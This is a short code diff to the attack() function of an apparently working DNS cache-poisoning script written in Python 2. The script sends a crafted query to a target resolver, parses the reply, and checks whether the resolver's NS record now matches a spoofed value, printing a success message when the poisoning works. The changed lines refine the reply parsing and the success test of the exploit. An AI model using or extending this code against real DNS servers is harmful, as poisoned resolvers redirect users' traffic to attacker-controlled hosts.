@@ -92,10 +92,9 @@ def attack():
         dns_request[DNS].qd.qname = base_domain
         sendPacket(sock, dns_request, my_ip, dns_port)
         response = sock.recv(4096)
-        print DNS(response).show()
+        response = DNS(response)
         try:
-            response = DNS(response[2:])
-            if response[DNS].ns:
+            if response[DNS].ns[0].rdata == spoof:
                 print "Successfully poisonned our target with a dummy record !!"
                 exit(0)
             else:
